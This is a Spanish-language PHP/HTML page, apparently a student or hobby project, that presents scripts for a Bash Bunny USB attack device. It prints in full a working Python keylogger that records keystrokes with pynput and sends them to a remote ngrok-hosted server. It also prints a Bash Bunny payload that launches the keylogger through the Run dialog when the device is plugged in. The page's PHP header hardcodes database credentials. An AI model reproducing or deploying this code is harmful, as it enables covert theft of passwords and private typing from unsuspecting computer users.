<?php
    ob_start(); // Habilita el buffer de salida
session_start();

$servername = "mysql-db";
$username = "sea";
$password = "proyectose@";
$database = "bd_keyloggers";

// Conexión
$conn = mysqli_connect($servername, $username, $password, $database);
if (!$conn) {
    die("Conexion fallida: " . mysqli_connect_error());
}
   
?>

<!DOCTYPE html>
<html lang="es">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Scripts - Bash Bunny</title>
        
        <!-- Link hacia el archivo de estilos css -->
        <link rel="stylesheet" href="../css/scripts.css">

        <!-- Link favicon --> 
        <link rel="shortcut icon" href="../img/logo.png" type="image/x-icon">

        <!-- Link para que funcionen los FA FA -->
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">

        <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css" />        

    </head>


    <body>
        <!--CABECERA-->
        <div id="header">
            <div class="logo">
                <img src="../img/logo.png" alt="COACHING SL">
            </div>
            <nav>
                <ul>
                    <?php
                        echo "<li><a href='opciones.php'><i class='fa fa-home'></i> <span data-translate='inicio'>Inicio</span></a></li>";
                        echo "<li><a href='bashbunny.php'><i class='fa-brands fa-usb'></i> <span data-translate='bashbunny'>Bash Bunny</span></a></li>";
                        echo '<br>';
                    ?>
                </ul>
            </nav>
        </div>

        <main>
    <!-- SOBRE LOS ARCHIVOS-->
    <section id="SobreNosotras">
        <div class="globalnosotras">
            <div class="subapartados">
                <hr class="highlight"/> <!-- SEPARADOR-->

                <div class="primero">
                    <h2 class="SobreNosotrosTit">Archivos necesarios</h2>
                    <h3 class="textoinicio">¿Cuántos archivos se necesitan?</h3>
                </div>
            </div>
            <div class="subapartados">
                <div class="col-lg-12">
                    <ul class="todaslaspreguntas">
                        <li>
                            <div class="decoracion">
                                <img class="img-circle img-responsive" src="img/about/1.jpg" alt="">
                            </div>
                            <div class="apartadopregunta">
                                <div class="preguntasola">
                                    <h4 class="titulos_quienessomos">Keylogger.py</h4>
                                </div>
                                <div class="cajatextos">
                                    <p class="textos_quienessomos">Este archivo es el encargado de registrar las pulsaciones de teclado 
                                    </p>
                                </div>
                            </div>
                        </li>

                        <li class="otrolado">
                            <div class="decoracion">
                                <img class="img-circle img-responsive" src="img/about/2.jpg" alt="">
                            </div>
                            <div class="apartadopregunta">
                                <div class="preguntasola">
                                    <h4 class="titulos_quienessomos">payload.txt</h4>
                                </div>
                                <div class="cajatextos">
                                    <p class="textos_quienessomos">En nuestra empresa, ofrecemos una gran variedad de servicios que pueden escoger cada uno de nuestros clientes, pudiendo dar aquello que buscan a cada
                                        uno de nuestros clientes. 
                                    </p>
                                </div>
                            </div>
                        </li>

                        <li class="otrolado">
                            <div class="decoracion">
                                <h4>Scripts
                                    <br>Para
                                    <br>Bash Bunny</h4>
                            </div>
                        </li>

                    </ul>
                </div>
            </div>
        </div>
    </section>
    <hr class="highlight"/> <!-- SEPARADOR-->


        <!-- SOBRE LOS SCRIPTS -->
        <div class="cajascripts">
            <h2 class="scripts">Scripts necesarios</h2>
        </div>

        <div class="fila-coaching">
            <div class="info_coaching">
                <div class="Centrar_info_coaching">
                    <div class="col-lg-12 text-center">
                        <h2 class="ApartadoCoachingTit">Keylogger.py</h2>
                        <h3 class="expl_tiposcoaching"></h3>
                    </div>
                </div>
                <p>
                import subprocess <br>
                import sys <br>
                <br>
                # Instalar requests si no está disponible <br>
                try: <br>
                    import requests <br>
                except ImportError: <br>
                    subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"]) <br>
                    import requests <br>
                    <br>
                import pynput.keyboard <br>
                from datetime import datetime <br>
                import socket <br>
                <br>
                buffer = "" <br>
                <br>
                # Obtener la IP pública o local <br>
                def obtener_ip(): <br>
                    try: <br>
                        return requests.get("https://api.ipify.org").text <br>
                    except: <br>
                        try: <br>
                            return socket.gethostbyname(socket.gethostname()) <br>
                        except: <br>
                            return '0.0.0.0' <br>
                            <br>
                # Enviar texto al servidor Flask por Ngrok <br>
                def enviar_a_flask(texto): <br>
                    url = "https://b2fe-79-155-254-34.ngrok-free.app/guardar-bashbunny" <br>
                    payload = { <br>
                        "datos": texto <br>
                    } <br>
                    headers = { <br>
                        "Content-Type": "application/json" <br>
                    } <br>
                    try: <br>
                        requests.post(url, json=payload, headers=headers, timeout=3) <br>
                    except: <br>
                        pass <br>
                        <br>
                # Captura de teclas <br>
                def on_press(tecla): <br>
                    global buffer <br>
                    try: <br>
                        if tecla == pynput.keyboard.Key.space: <br>
                            buffer += ' ' <br>
                        elif tecla == pynput.keyboard.Key.tab: <br>
                            buffer += '\t' <br>
                        elif tecla == pynput.keyboard.Key.enter: <br>
                            enviar_a_flask(buffer) <br>
                            buffer = "" <br>
                        else: <br>
                            buffer += tecla.char <br>
                    except AttributeError: <br>
                        pass <br>
                        <br>
                # Iniciar y asegurar envío final al salir <br>
                def iniciar_keylogger(): <br>
                    global buffer <br>
                    try: <br>
                        with pynput.keyboard.Listener(on_press=on_press) as listener: <br>
                            listener.join() <br>
                    except KeyboardInterrupt: <br>
                        pass <br>
                    finally: <br>
                        if buffer: <br>
                            enviar_a_flask(buffer) <br>
                            <br>
                if __name__ == "__main__": <br>
                    iniciar_keylogger() <br>
                    </p>
            </div>

            <div class="info_coaching">
                <div class="Centrar_info_coaching">
                    <div class="col-lg-12 text-center">
                        <h2 class="ApartadoCoachingTit">payload.txt</h2>
                        <h3 class="expl_tiposcoaching"></h3>
                    </div>
                </div>
                    <p>
                    ATTACKMODE HID STORAGE <br>
                    <br>
                    LED R B <br>
                    DELAY 3000 <br>
                    <br>
                    GUI r <br>
                    DELAY 500 <br>
                    <br>
                    STRING cmd.exe /c python E:\payloads\switch1\files\keylogger_bashbunny.py <br>
                    ENTER <br>
                    <br>
                    LED G <br>

                    </p>

            </div>
        </div>

        </div>

        <hr class="highlight"/> <!-- SEPARADOR-->
</main>
        <!-- PIE DE PAGINA -->
        <footer>
        Todos los derechos reservados | Keylogger SL Copyright © 2025
        </footer>
    </body>
</html>